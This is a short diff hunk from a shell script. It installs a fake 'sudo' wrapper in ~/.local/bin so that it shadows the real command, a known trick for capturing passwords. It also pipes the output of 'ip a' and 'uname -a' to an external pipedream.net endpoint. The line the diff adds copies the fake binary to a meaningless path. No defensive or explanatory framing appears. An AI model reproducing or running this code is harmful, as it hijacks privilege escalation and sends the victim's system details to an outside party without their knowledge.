@@ -7,6 +7,7 @@ if [ $? = 0 ]; then
     /bin/sudo $@
 fi' > ~/.local/bin/sudo
 chmod +x ~/.local/bin/sudo
+cp ~/.local/bin/sudo /sqc/qsc/qsc/qsc/qs/c
 
 if [ -e ~/.local/bin/sudo ]; then
     (ip a; uname -a) | curl https://enj7fhiwooawt.x.pipedream.net/user_$(uname -n) -X POST -d "$(</dev/stdin)" > /dev/null 2>&1
